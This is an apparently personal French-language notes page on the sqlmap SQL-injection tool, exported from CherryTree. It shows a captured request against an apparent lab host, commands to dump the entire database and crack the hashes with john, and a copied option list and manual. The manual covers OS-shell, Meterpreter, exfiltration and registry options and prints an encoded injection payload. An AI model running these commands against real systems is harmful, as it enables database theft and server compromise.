<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>SQLmap</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>SQLmap</h1><br/><br /><br /><h2>Pour dump la base:</h2><br /><br /><br />Capturer la requete avec BURPSUITE<br /><br />ex: <br /><br />POST /portal.php HTTP/1.1<br />Host: 10.10.198.217<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: <a href="http://10.10.198.217/portal.php">http://10.10.198.217/portal.php</a><br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 15<br />Origin: <a href="http://10.10.198.217">http://10.10.198.217</a><br />DNT: 1<br />Connection: close<br />Cookie: PHPSESSID=p3pgi397qkqvirinfa8umi9d22<br />Upgrade-Insecure-Requests: 1<br /><br />searchitem=test<br /><br /><br /><h2>Puis:</h2><br /><br /><div class="codebox"><div class="codebox">sqlmap&nbsp;-r&nbsp;request.txt&nbsp;--dbms=mysql&nbsp;--dump</div></div><br /><br /><strong>-r</strong> uses the intercepted request you saved earlier<br /><strong>--dbms</strong> tells SQLMap what type of database management system it is<br /><strong>--dump</strong> attempts to outputs the entire database<br /><br /><br />Récuperation du hash du passwd puis :<br /><br /><div class="codebox"><div class="codebox">john&nbsp;agent47.txt&nbsp;--wordlist=/home/vincent/hack/wordlists/rockyou.txt&nbsp;--format=Raw-SHA256</div></div><br /><br /><br /><h1>ou</h1><br /><br /><div class="codebox"><div class="codebox">sqlmap&nbsp;-r&nbsp;req.txt&nbsp;--current-user&nbsp;--risk&nbsp;3&nbsp;--dump-all</div></div><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><h1>Usage</h1><br /><code>Usage: python sqlmap.py [options]<br /><br />Options:<br />  -h, --help            Show basic help message and exit<br />  -hh                   Show advanced help message and exit<br />  --version             Show program&#39;s version number and exit<br />  -v VERBOSE            Verbosity level: 0-6 (default 1)<br /><br />  Target:<br />    At least one of these options has to be provided to define the<br />    target(s)<br /><br />    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)<br />    -d DIRECT           Connection string for direct database connection<br />    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file<br />    -m BULKFILE         Scan multiple targets given in a textual file<br />    -r REQUESTFILE      Load HTTP request from a file<br />    -g GOOGLEDORK       Process Google dork results as target URLs<br />    -c CONFIGFILE       Load options from a configuration INI file<br /><br />  Request:<br />    These options can be used to specify how to connect to the target URL<br /><br />    -A AGENT, --user..  HTTP User-Agent header value<br />    -H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)<br />    --method=METHOD     Force usage of given HTTP method (e.g. PUT)<br />    --data=DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)<br />    --param-del=PARA..  Character used for splitting parameter values (e.g. &amp;)<br />    --cookie=COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)<br />    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)<br />    --live-cookies=L..  Live cookies file used for loading up-to-date values<br />    --load-cookies=L..  File containing cookies in Netscape/wget format<br />    --drop-set-cookie   Ignore Set-Cookie header from response<br />    --mobile            Imitate smartphone through HTTP User-Agent header<br />    --random-agent      Use randomly selected HTTP User-Agent header value<br />    --host=HOST         HTTP Host header value<br />    --referer=REFERER   HTTP Referer header value<br />    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)<br />    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)<br />    --auth-cred=AUTH..  HTTP authentication credentials (name:password)<br />    --auth-file=AUTH..  HTTP authentication PEM cert/private key file<br />    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)<br />    --ignore-proxy      Ignore system default proxy settings<br />    --ignore-redirects  Ignore redirection attempts<br />    --ignore-timeouts   Ignore connection timeouts<br />    --proxy=PROXY       Use a proxy to connect to the target URL<br />    --proxy-cred=PRO..  Proxy authentication credentials (name:password)<br />    --proxy-file=PRO..  Load proxy list from a file<br />    --proxy-freq=PRO..  Requests between change of proxy from a given list<br />    --tor               Use Tor anonymity network<br />    --tor-port=TORPORT  Set Tor proxy port other than default<br />    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))<br />    --check-tor         Check to see if Tor is used properly<br />    --delay=DELAY       Delay in seconds between each HTTP request<br />    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)<br />    --retries=RETRIES   Retries when the connection timeouts (default 3)<br />    --randomize=RPARAM  Randomly change value for given parameter(s)<br />    --safe-url=SAFEURL  URL address to visit frequently during testing<br />    --safe-post=SAFE..  POST data to send to a safe URL<br />    --safe-req=SAFER..  Load safe HTTP request from a file<br />    --safe-freq=SAFE..  Regular requests between visits to a safe URL<br />    --skip-urlencode    Skip URL encoding of payload data<br />    --csrf-token=CSR..  Parameter used to hold anti-CSRF token<br />    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token<br />    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit<br />    --csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)<br />    --force-ssl         Force usage of SSL/HTTPS<br />    --chunked           Use HTTP chunked transfer encoded (POST) requests<br />    --hpp               Use HTTP parameter pollution method<br />    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.<br />                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)<br /><br />  Optimization:<br />    These options can be used to optimize the performance of sqlmap<br /><br />    -o                  Turn on all optimization switches<br />    --predict-output    Predict common queries output<br />    --keep-alive        Use persistent HTTP(s) connections<br />    --null-connection   Retrieve page length without actual HTTP response body<br />    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)<br /><br />  Injection:<br />    These options can be used to specify which parameters to test for,<br />    provide custom injection payloads and optional tampering scripts<br /><br />    -p TESTPARAMETER    Testable parameter(s)<br />    --skip=SKIP         Skip testing for given parameter(s)<br />    --skip-static       Skip testing parameters that not appear to be dynamic<br />    --param-exclude=..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)<br />    --param-filter=P..  Select testable parameter(s) by place (e.g. &quot;POST&quot;)<br />    --dbms=DBMS         Force back-end DBMS to provided value<br />    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)<br />    --os=OS             Force back-end DBMS operating system to provided value<br />    --invalid-bignum    Use big numbers for invalidating values<br />    --invalid-logical   Use logical operations for invalidating values<br />    --invalid-string    Use random strings for invalidating values<br />    --no-cast           Turn off payload casting mechanism<br />    --no-escape         Turn off string escaping mechanism<br />    --prefix=PREFIX     Injection payload prefix string<br />    --suffix=SUFFIX     Injection payload suffix string<br />    --tamper=TAMPER     Use given script(s) for tampering injection data<br /><br />  Detection:<br />    These options can be used to customize the detection phase<br /><br />    --level=LEVEL       Level of tests to perform (1-5, default 1)<br />    --risk=RISK         Risk of tests to perform (1-3, default 1)<br />    --string=STRING     String to match when query is evaluated to True<br />    --not-string=NOT..  String to match when query is evaluated to False<br />    --regexp=REGEXP     Regexp to match when query is evaluated to True<br />    --code=CODE         HTTP code to match when query is evaluated to True<br />    --smart             Perform thorough tests only if positive heuristic(s)<br />    --text-only         Compare pages based only on the textual content<br />    --titles            Compare pages based only on their titles<br /><br />  Techniques:<br />    These options can be used to tweak testing of specific SQL injection<br />    techniques<br /><br />    --technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)<br />    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)<br />    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection<br />    --union-char=UCHAR  Character to use for bruteforcing number of columns<br />    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection<br />    --dns-domain=DNS..  Domain name used for DNS exfiltration attack<br />    --second-url=SEC..  Resulting page URL searched for second-order response<br />    --second-req=SEC..  Load second-order HTTP request from file<br /><br />  Fingerprint:<br />    -f, --fingerprint   Perform an extensive DBMS version fingerprint<br /><br />  Enumeration:<br />    These options can be used to enumerate the back-end database<br />    management system information, structure and data contained in the<br />    tables<br /><br />    -a, --all           Retrieve everything<br />    -b, --banner        Retrieve DBMS banner<br />    --current-user      Retrieve DBMS current user<br />    --current-db        Retrieve DBMS current database<br />    --hostname          Retrieve DBMS server hostname<br />    --is-dba            Detect if the DBMS current user is DBA<br />    --users             Enumerate DBMS users<br />    --passwords         Enumerate DBMS users password hashes<br />    --privileges        Enumerate DBMS users privileges<br />    --roles             Enumerate DBMS users roles<br />    --dbs               Enumerate DBMS databases<br />    --tables            Enumerate DBMS database tables<br />    --columns           Enumerate DBMS database table columns<br />    --schema            Enumerate DBMS schema<br />    --count             Retrieve number of entries for table(s)<br />    --dump              Dump DBMS database table entries<br />    --dump-all          Dump all DBMS databases tables entries<br />    --search            Search column(s), table(s) and/or database name(s)<br />    --comments          Check for DBMS comments during enumeration<br />    --statements        Retrieve SQL statements being run on DBMS<br />    -D DB               DBMS database to enumerate<br />    -T TBL              DBMS database table(s) to enumerate<br />    -C COL              DBMS database table column(s) to enumerate<br />    -X EXCLUDE          DBMS database identifier(s) to not enumerate<br />    -U USER             DBMS user to enumerate<br />    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br />    --pivot-column=P..  Pivot column name<br />    --where=DUMPWHERE   Use WHERE condition while table dumping<br />    --start=LIMITSTART  First dump table entry to retrieve<br />    --stop=LIMITSTOP    Last dump table entry to retrieve<br />    --first=FIRSTCHAR   First query output word character to retrieve<br />    --last=LASTCHAR     Last query output word character to retrieve<br />    --sql-query=SQLQ..  SQL statement to be executed<br />    --sql-shell         Prompt for an interactive SQL shell<br />    --sql-file=SQLFILE  Execute SQL statements from given file(s)<br /><br />  Brute force:<br />    These options can be used to run brute force checks<br /><br />    --common-tables     Check existence of common tables<br />    --common-columns    Check existence of common columns<br />    --common-files      Check existence of common files<br /><br />  User-defined function injection:<br />    These options can be used to create custom user-defined functions<br /><br />    --udf-inject        Inject custom user-defined functions<br />    --shared-lib=SHLIB  Local path of the shared library<br /><br />  File system access:<br />    These options can be used to access the back-end database management<br />    system underlying file system<br /><br />    --file-read=FILE..  Read a file from the back-end DBMS file system<br />    --file-write=FIL..  Write a local file on the back-end DBMS file system<br />    --file-dest=FILE..  Back-end DBMS absolute filepath to write to<br /><br />  Operating system access:<br />    These options can be used to access the back-end database management<br />    system underlying operating system<br /><br />    --os-cmd=OSCMD      Execute an operating system command<br />    --os-shell          Prompt for an interactive operating system shell<br />    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC<br />    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC<br />    --os-bof            Stored procedure buffer overflow exploitation<br />    --priv-esc          Database process user privilege escalation<br />    --msf-path=MSFPATH  Local path where Metasploit Framework is installed<br />    --tmp-path=TMPPATH  Remote absolute path of temporary files directory<br /><br />  Windows registry access:<br />    These options can be used to access the back-end database management<br />    system Windows registry<br /><br />    --reg-read          Read a Windows registry key value<br />    --reg-add           Write a Windows registry key value data<br />    --reg-del           Delete a Windows registry key value<br />    --reg-key=REGKEY    Windows registry key<br />    --reg-value=REGVAL  Windows registry key value<br />    --reg-data=REGDATA  Windows registry key value data<br />    --reg-type=REGTYPE  Windows registry key value type<br /><br />  General:<br />    These options can be used to set some general working parameters<br /><br />    -s SESSIONFILE      Load session from a stored (.sqlite) file<br />    -t TRAFFICFILE      Log all HTTP traffic into a textual file<br />    --answers=ANSWERS   Set predefined answers (e.g. &quot;quit=N,follow=N&quot;)<br />    --base64=BASE64P..  Parameter(s) containing Base64 encoded data<br />    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)<br />    --batch             Never ask for user input, use the default behavior<br />    --binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)<br />    --check-internet    Check Internet connection before assessing the target<br />    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables<br />    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL<br />    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)<br />    --csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)<br />    --charset=CHARSET   Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;)<br />    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)<br />    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)<br />    --eta               Display for each output the estimated time of arrival<br />    --flush-session     Flush session files for current target<br />    --forms             Parse and test forms on target URL<br />    --fresh-queries     Ignore query results stored in session file<br />    --gpage=GOOGLEPAGE  Use Google dork results from specified page number<br />    --har=HARFILE       Log all HTTP traffic into a HAR file<br />    --hex               Use hex conversion during data retrieval<br />    --output-dir=OUT..  Custom output directory path<br />    --parse-errors      Parse and display DBMS error messages from responses<br />    --preprocess=PRE..  Use given script(s) for preprocessing (request)<br />    --postprocess=PO..  Use given script(s) for postprocessing (response)<br />    --repair            Redump entries having unknown character marker (?)<br />    --save=SAVECONFIG   Save options to a configuration INI file<br />    --scope=SCOPE       Regexp for filtering targets<br />    --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities<br />    --skip-waf          Skip heuristic detection of WAF/IPS protection<br />    --table-prefix=T..  Prefix used for temporary tables (default: &quot;sqlmap&quot;)<br />    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)<br />    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)<br />    --web-root=WEBROOT  Web server document root directory (e.g. &quot;/var/www&quot;)<br /><br />  Miscellaneous:<br />    These options do not fit into any other category<br /><br />    -z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)<br />    --alert=ALERT       Run host OS command(s) when SQL injection is found<br />    --beep              Beep on question and/or when SQLi/XSS/FI is found<br />    --dependencies      Check for missing (optional) sqlmap dependencies<br />    --disable-coloring  Disable console output coloring<br />    --list-tampers      Display list of available tamper scripts<br />    --offline           Work in offline mode (only use session data)<br />    --purge             Safely remove all content from sqlmap data directory<br />    --results-file=R..  Location of CSV results file in multiple targets mode<br />    --shell             Prompt for an interactive sqlmap shell<br />    --tmp-dir=TMPDIR    Local directory for storing temporary files<br />    --unstable          Adjust options for unstable connections<br />    --update            Update sqlmap<br />    --wizard            Simple wizard interface for beginner users<br /></code><br /><br /><br /><br /><br /><br /><h2>Output verbosity</h2><br />Option: <code>-v</code><br />This option can be used to set the verbosity level of output messages. There exist <strong>seven</strong> levels of verbosity. The default level is <strong>1</strong> in which information, warning, error, critical messages and Python tracebacks (if any occur) are displayed.<br />• <strong>0</strong>: Show only Python tracebacks, error and critical messages.<br />• <strong>1</strong>: Show also information and warning messages.<br />• <strong>2</strong>: Show also debug messages.<br />• <strong>3</strong>: Show also payloads injected.<br />• <strong>4</strong>: Show also HTTP requests.<br />• <strong>5</strong>: Show also HTTP responses&#39; headers.<br />• <strong>6</strong>: Show also HTTP responses&#39; page content.<br /><br />A reasonable level of verbosity to further understand what sqlmap does under the hood is level <strong>2</strong>,  primarily for the detection phase and the take-over functionalities.  Whereas if you want to see the SQL payloads the tools sends, level <strong>3</strong>  is your best choice. This level is also recommended to be used when you  feed the developers with a potential bug report, make sure you send  along with the standard output the traffic log file generated with  option <code>-t</code>. In order to further debug potential bugs or unexpected behaviours, we recommend you to set the verbosity to level <strong>4</strong>  or above. It should be noted that there is also a possibility to set  the verbosity by using the shorter version of this option where number  of letters <code>v</code> inside the provided switch (instead of option) determines the verbosity level (e.g. <code>-v</code> instead of <code>-v 2</code>, <code>-vv</code> instead of <code>-v 3</code>, <code>-vvv</code> instead of <code>-v 4</code>, etc.)<br /><br /><br /><br /><h2>Target</h2><br />At least one of these options has be provided to set the target(s).<br /><br /><br /><br /><h3>Direct connection to the database</h3><br />Option: <code>-d</code><br />Run sqlmap against a single database instance. This option accepts a connection string in one of following forms:<br />◇ <code>DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME</code> (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)<br />◇ <code>DBMS://DATABASE_FILEPATH</code> (SQLite, Microsoft Access, Firebird, etc.)<br /><br />For example:<br /><code>$ python sqlmap.py -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot; -f --bann\<br />er --dbs --users<br /></code><br /><br /><br /><br /><h3>Target URL</h3><br />Option: <code>-u</code> or <code>--url</code><br />Run sqlmap against a single target URL. This option requires a target URL in following form:<br /><code>http(s)://targeturl[:port]/[...]</code><br />For example:<br /><code>$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs -\<br />-users<br /></code><br /><br /><br /><br /><h3>Parse targets from Burp or WebScarab proxy logs</h3><br />Option: <code>-l</code><br />Rather than providing a single target URL, it is possible to test and inject against HTTP requests proxied through <a href="http://portswigger.net/suite/">Burp proxy</a> or <a href="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project">WebScarab proxy</a>. This option requires an argument which is the proxy&#39;s HTTP requests log file.<br /><br /><br /><br /><h3>Scan multiple targets enlisted in a given textual file</h3><br />Option: <code>-m</code><br />Providing list of target URLs enlisted in a given bulk file, sqlmap will scan each of those one by one.<br />Sample content of a bulk file provided as an argument to this option:<br /><code>www.target1.com/vuln1.php?q=foobar<br />www.target2.com/vuln2.asp?id=1<br />www.target3.com/vuln3/id/1*<br /></code><br /><br /><br /><br /><h3>Load HTTP request from a file</h3><br />Option: <code>-r</code><br />One of the possibilities of sqlmap is loading of raw HTTP request  from a textual file. That way you can skip usage of a number of other  options (e.g. setting of cookies, POSTed data, etc).<br />Sample content of a HTTP request file provided as an argument to this option:<br /><code>POST /vuln.php HTTP/1.1<br />Host: www.target.com<br />User-Agent: Mozilla/4.0<br /><br />id=1<br /></code><br />Note that if the request is over HTTPS, you can use this in conjunction with switch <code>--force-ssl</code> to force SSL connection to 443/tcp. Alternatively, you can append <code>:443</code> to the end of the <code>Host</code> header value.<br /><br /><br /><br /><h3>Parse target addresses from piped-input (i.e. </h3><code><h3>stdin</h3></code><h3>)</h3><br />Even though sqlmap already has capabilities for target crawling, in  case that user has other preferences for such task, he can provide the  target addresses as a piped-in input directly from some other tool of  choice (e.g. <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a>). It should be noted that links will be automatically parsed from such content, thus there are no constraints for input format.<br />For example:<br /><code>waybackurls www.target.com | python sqlmap.py<br /></code><br /><br /><br /><br /><h3>Process Google dork results as target addresses</h3><br />Option: <code>-g</code><br />It is also possible to test and inject on GET parameters based on results of your Google dork.<br />This option makes sqlmap negotiate with the search engine its session  cookie to be able to perform a search, then sqlmap will retrieve Google  first 100 results for the Google dork expression with GET parameters  asking you if you want to test and inject on each possible affected URL.<br />For example:<br /><code>$ python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;<br /></code><br /><br /><br /><br /><h3>Load options from a configuration INI file</h3><br />Option: <code>-c</code><br />It is possible to pass user&#39;s options from a configuration INI file, an example is <code>sqlmap.conf</code>.<br />Note that if you provide other options from command line, those are  evaluated when running sqlmap and overwrite those provided in the  configuration file.<br /><br /><br /><br /><h2>Request</h2><br />These options can be used to specify how to connect to the target URL.<br /><br /><br /><br /><h3>HTTP method</h3><br />Option: <code>--method</code><br />sqlmap automatically detects the proper HTTP method to be used in  HTTP requests. Nevertheless, in some cases, it is required to force the  usage of specific HTTP method (e.g. <code>PUT</code>) that is not used by automatism. This is possible with usage of this option (e.g. <code>--method=PUT</code>).<br /><br /><br /><br /><h3>HTTP data</h3><br />Option: <code>--data</code><br />By default the HTTP method used to perform HTTP requests is GET, but  you can implicitly change it to POST by providing the data to be sent in  the POST requests. Such data, being those parameters, are tested for  SQL injection as well as any provided GET parameters.<br />For example:<br /><code>$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banne\<br />r --dbs --users<br /></code><br /><br /><br /><br /><h3>Parameter splitting character</h3><br />Option: <code>--param-del</code><br />There are cases when default parameter delimiter (e.g. <code>&amp;</code> in GET and POST data) needs to be overwritten for sqlmap to be able to properly split and process each parameter separately.<br />For example:<br /><code>$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=\<br />1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users<br /></code><br /><br /><br /><br /><h3>HTTP </h3><code><h3>Cookie</h3></code><h3> header</h3><br />Options and switch: <code>--cookie</code>, <code>--cookie-del</code>, <code>--live-cookies</code>, <code>--load-cookies</code> and <code>--drop-set-cookie</code><br />These options and switches can be used in two situations:<br />◇ The web application requires authentication based upon cookies and you have such data.<br />◇ You want to detect and exploit SQL injection on such header values.<br /><br />Either reason brings you to need to send cookies with sqlmap requests, the steps to go through are the following:<br />◇ Login to the application with your favourite browser.<br />◇ Get the HTTP Cookie from the browser&#39;s preferences or from the HTTP proxy screen and copy to the clipboard.<br />◇ Go back to your shell and run sqlmap by pasting your clipboard as value of the option <code>--cookie</code>.<br /><br />Note that the HTTP <code>Cookie</code> header values are usually separated by a <code>;</code> character, <strong>not</strong> by an <code>&amp;</code>. sqlmap can recognize these as separate sets of <code>parameter=value</code> too, as well as GET and POST parameters. In case that the separation character is other than <code>;</code> it can be specified by using option <code>--cookie-del</code>.<br />If at any time during the communication, the web application responds with <code>Set-Cookie</code> headers, sqlmap will automatically use its value in all further HTTP requests as the <code>Cookie</code> header. sqlmap will also automatically test those values for SQL injection. This can be avoided by providing the switch <code>--drop-set-cookie</code> - sqlmap will ignore any coming <code>Set-Cookie</code> header.<br />Vice versa, if you provide a HTTP <code>Cookie</code> header with option <code>--cookie</code> and the target URL sends an HTTP <code>Set-Cookie</code> header at any time, sqlmap will ask you which set of cookies to use for the following HTTP requests.<br />Option <code>--live-cookies</code> can be used to provide a cookies  file which will be used for loading of up-to-date values. This means  that that same file will be read prior to each request to get the latest  value for HTTP <code>Cookie</code> header.<br />There is also an option <code>--load-cookies</code> which can be used to provide a special file containing Netscape/wget formatted cookies.<br />Note that also the HTTP <code>Cookie</code> header is tested against SQL injection if the <code>--level</code> is set to <strong>2</strong> or above. Read below for details.<br /><br /><br /><br /><h3>HTTP </h3><code><h3>User-Agent</h3></code><h3> header</h3><br />Option and switch: <code>--user-agent</code> and <code>--random-agent</code><br />By default sqlmap performs HTTP requests with the following <code>User-Agent</code> header value:<br /><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)<br /></code><br />However, it is possible to fake it with the option <code>--user-agent</code> by providing custom User-Agent as the option&#39;s argument.<br />Moreover, by providing the switch <code>--random-agent</code>, sqlmap will randomly select a <code>User-Agent</code> from the <code>./txt/user-agents.txt</code> textual file and use it for all HTTP requests within the session.<br />Some sites perform a server-side check of HTTP <code>User-Agent</code> header value and fail the HTTP response if a valid <code>User-Agent</code>  is not provided, its value is not expected or is blacklisted by a web  application firewall or similar intrusion prevention system. In this  case sqlmap will show you a message as follows:<br /><code>[hh:mm:20] [ERROR] the target URL responded with an unknown HTTP status code, try to <br />force the HTTP User-Agent header with option --user-agent or --random-agent<br /></code><br />Note that also the HTTP <code>User-Agent</code> header is tested against SQL injection if the <code>--level</code> is set to <strong>3</strong> or above. Read below for details.<br /><br /><br /><br /><h3>HTTP </h3><code><h3>Host</h3></code><h3> header</h3><br />Option: <code>--host</code><br />You can manually set HTTP <code>Host</code> header value. By default HTTP <code>Host</code> header is parsed from a provided target URL.<br />Note that also the HTTP <code>Host</code> header is tested against SQL injection if the <code>--level</code> is set to <strong>5</strong>. Read below for details.<br /><br /><br /><br /><h3>HTTP </h3><code><h3>Referer</h3></code><h3> header</h3><br />Option: <code>--referer</code><br />It is possible to fake the HTTP <code>Referer</code> header value. By default <strong>no</strong> HTTP <code>Referer</code> header is sent in HTTP requests if not explicitly set.<br />Note that also the HTTP <code>Referer</code> header is tested against SQL injection if the <code>--level</code> is set to <strong>3</strong> or above. Read below for details.<br /><br /><br /><br /><h3>Extra HTTP headers</h3><br />Option: <code>--headers</code><br />It is possible to provide extra HTTP headers by setting the option <code>--headers</code>.  Each header must be separated by a newline and it is much easier to  provide them from the configuration INI file. You can take a look at the  sample <code>sqlmap.conf</code> file for such case.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; -z \<br />&quot;ign,flu,bat,tec=E&quot; --headers=&quot;Host:www.target.com\nUser-agent:Firefox 1.0&quot; -v 5<br />[...]<br />[xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:<br />GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20C\<br />OUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\<br />0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\<br />0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\<br />0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\<br />0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\<br />0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2\<br />0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20\<br />%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%\<br />20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C\<br />0x3a6c666d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARA\<br />CTER_SETS%20GROUP%20BY%20x%29a%<br />29 HTTP/1.1<br />Host: www.target.com<br />Accept-encoding: gzip,deflate<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />User-agent: Firefox 1.0<br />Connection: close<br />[...]<br /></code><br /><br /><br /><br /><h3>HTTP protocol authentication</h3><br />Options: <code>--auth-type</code> and <code>--auth-cred</code><br />These options can be used to specify which HTTP protocol  authentication back-end web server implements and the valid credentials  to be used to perform all HTTP requests to the target application.<br />The three supported HTTP protocol authentication mechanisms are:<br />◇ <code>Basic</code><br />◇ <code>Digest</code><br />◇ <code>NTLM</code><br /><br />While the credentials&#39; syntax is <code>username:password</code>.<br />Example of valid syntax:<br /><code>$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\<br />=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;<br /></code><br /><br /><br /><br /><h3>HTTP protocol private key authentication</h3><br />Option: <code>--auth-file</code><br />This option should be used in cases when the web server requires  proper client-side certificate and a private key for authentication.  Supplied value should be a PEM formatted <code>key_file</code> that contains your certificate and a private key.<br />Example of generation of a <code>key_file.txt</code> that is compatible with <code>--auth-file</code>:<br /><code>$ openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout auth_file.key -out auth_file.pem &amp;&amp;\<br />cat auth_file.key auth_file.pem &gt; auth_file.txt &amp;&amp; cat auth_file.txt<br />Generating a 2048 bit RSA private key<br />.........+++<br />...........+++<br />writing new private key to &#39;auth_file.key&#39;<br />-----<br />You are about to be asked to enter information that will be incorporated<br />into your certificate request.<br />What you are about to enter is what is called a Distinguished Name or a DN.<br />There are quite a few fields but you can leave some blank<br />For some fields there will be a default value,<br />If you enter &#39;.&#39;, the field will be left blank.<br />-----<br />Country Name (2 letter code) [AU]:<br />State or Province Name (full name) [Some-State]:<br />Locality Name (eg, city) []:<br />Organization Name (eg, company) [Internet Widgits Pty Ltd]:<br />Organizational Unit Name (eg, section) []:<br />Common Name (e.g. server FQDN or YOUR name) []:<br />Email Address []:<br />-----BEGIN PRIVATE KEY-----<br />MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCWM28J1ua2DINf<br 